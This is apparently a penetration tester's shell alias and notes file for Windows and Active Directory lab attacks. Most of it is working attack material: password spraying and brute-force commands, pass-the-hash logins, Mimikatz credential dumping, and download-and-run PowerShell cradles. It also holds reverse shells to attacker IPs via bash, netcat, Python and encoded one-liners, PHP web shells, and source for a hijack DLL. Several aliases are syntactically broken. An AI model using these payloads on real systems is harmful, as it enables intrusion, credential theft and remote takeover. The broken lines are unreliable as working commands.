# alias example='(){ echo Your arg was $1. ;}
alias magic='source /home/kali/.zshrc_alias'
alias shells='(){ shells.sh $1 ;}'
alias setcwd='(){export cwd="$1"}'
alias cwd='(){cd $cwd}'
alias printcwd'(){echo $cwd}'
#### SMB ####
#enum4linux -a $ip
alias auto_crackmap='echo "crackmapexec smb 192.168.200.75 -u usernames.txt -p 'Nexus123!' -d corp.com --continue-on-success";echo "or --shares"'
#### DNS ####
alias auto_dnsrecon="dnsrecon -d $ip /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.md"
#dnsrecon list = dnsrecon -d megacorpone.com -t axfr
#### LDAP ###
alias auto_ldap='(){ldapsearch -h "$1" -p "$2" -x -s base}'
#### Transfer Files #####
alias iwr='(){echo "iwr -uri http://$ip:8000/$1 -Outfile $1"'
alias startWebDav='(){wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/}'
#### Hydra #####
alias hydra_unk '(){hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt -vV $ip "$1"}
alias hydra_gethttp '(){hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-get "$1"' # $1 = /webpage/
alias hydra_httppostform '(){echo "hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"}'
alias hashcat_auto
#### Impacket ####
#alias impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
#alias impacket-wmiexec -hashes 00000000000000000000000000000000: 2a944a58d4ffa77137b2c587e6ed7626 maria@192.168.210.70
#alias impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG5...." #dir \\192.168.119.2\test -> on tgt machine
#alias impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
#alias mysql= -u root -p 'root' -h 192.168.50.16 -P 3306
#alias powershell_oneliner='(){powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/powercat.ps1');
powercat -c 192.168.45.245 -p 4444 -e powershell"
#### Ligolo-ng ####
alias start_ligolo '(){sudo ip tuntap add user `hostname` mode tun ligolo;sudo ip link set ligolo up;./proxy -self-cert}'
alias echo_ligolo_client '(){echo "./agent -connect $lhost:11601";echo "sudo ip route add __IP__ dev ligolo"}'
alias ligolo_listeners '(){echo "listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:4444 --tcp";echo "listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:4444 --tcp"}'
alias ligolo_magicip 'echo "Local Ligolo Agent IP = 240.0.0.1"'
#### Mimikatz ####
alias print_mimikatz = 'echo ".\mimikatz.exe";echo "privilege::debug";echo "sekurlsa::logonpasswords"; echo "token::elevate"; echo "lsadump::sam";'
#### Get Usernames ####
alias get_kerb_users_nmap="(){nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=''}"
#kerbrute= kerbrute bruteuser -d test.local passwords.txt john
#### lsassy ####
#https://github.com/tristanp299/Attack_Chain/blob/main/lsassy.md
#### Get Hashes ####
alias getnpusers='(){python3 GetNPUsers.py test.local/ -dc-ip "$1" -usersfile usernames.txt -format hashcat -outputfile getnpusers_hashes.txt}`
#### Found Hash #######
alias smbhashlogin="(){echo 'smbclient \\\\$ip\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b'}"
#smbclient //server/share --directory path/to/directory -c 'get file.txt'
#`net view \\\\dc01 /all`
#### Pivoting ####
# evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3


##### Runas #####
EoP - Runas
Use the cmdkey to list the stored credentials on the machine.

#### Windows PrivEsc ####
alias printPrintSpoofer='echo ".\PrintSpoofer64.exe -i -c cmd"'
alias powerup='echo ". .\PowerUp.ps1 ; Invoke-AllChecks"'
```
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.

runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
Using runas with a provided set of credential.


C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

##### Unquoted Service #####
# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
##### DLL Hijacking 2.0 #####
#alias PowerUp='Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
##### DLL Hijacking ####
# find missing DLL 
- Find-PathDLLHijack PowerUp.ps1
- Process Monitor : check for "Name Not Found"
##### Unquoted Service Path ####
#powershell -nop -exec bypass -c "(New-Object Net.WebClient).DownloadFile('http://192.168.0.114:8080/common.exe', 'C:\Program Files\Unquoted Path Service\common.exe')"

# compile a malicious dll
- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

# content of windows_dll.c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}

##### shell info script ###
'''
LIP=$(ip -4 a show tun0 | grep -Po 'inet \K[\d.]+')

if [ $# -eq 0 ]
then
  PORT=64385
else
  PORT=$1
fi

echo "Local IP=$LIP"
echo "PORT=$PORT"

echo ""
echo '********** Bash **********'
echo "bash -c 'bash -i >& /dev/tcp/$LIP/$PORT 0>&1'"
echo "bash+-c+'bash+-i+>%26+/dev/tcp/$LIP/$PORT+0>%261'"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LIP $PORT >/tmp/f"
echo "rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20$LIP%20$PORT%20%3E/tmp/f"
echo "nc $LIP $PORT -e /bin/sh"

ENCODED=$(echo -ne "bash -c 'bash -i >& /dev/tcp/$LIP/$PORT 0>&1'" | base64 -w0)
echo "echo $ENCODED | base64 -d | sh"

echo ""
echo '********** PHP **********'
cat << "EOF"
<?php
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
  }
?>
EOF
echo '<%3fphp+if(isset($_REQUEST['cmd'])){+echo+"<pre>"%3b+$cmd+%3d+($_REQUEST['cmd'])%3b+system($cmd)%3b+echo+"</pre>"%3b+die%3b+}+%3f>'
echo '<?php echo system($_GET['cmd']); ?>'
echo '<%3fphp+echo+system($_GET[cmd])%3b+%3f>'

echo ""
echo '********** Python **********'
echo '## Python 2'
cat << EOF
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LIP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
EOF
echo '## Python 3'
cat << EOF
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LIP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
EOF

echo ""
echo '********** PowerShell **********'
echo "pshell.py $LIP $PORT"

echo ""
echo '********** Windows NetCat **********'
echo ".\\nc.exe $LIP $PORT -e cmd.exe"

echo ""
echo '********** Interactive Shell **********'
cat << EOF
which python python2 python3
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
# Ctrl + Z [Background Process]
stty raw -echo;fg;reset
stty columns 118 rows 64
EOF
'''
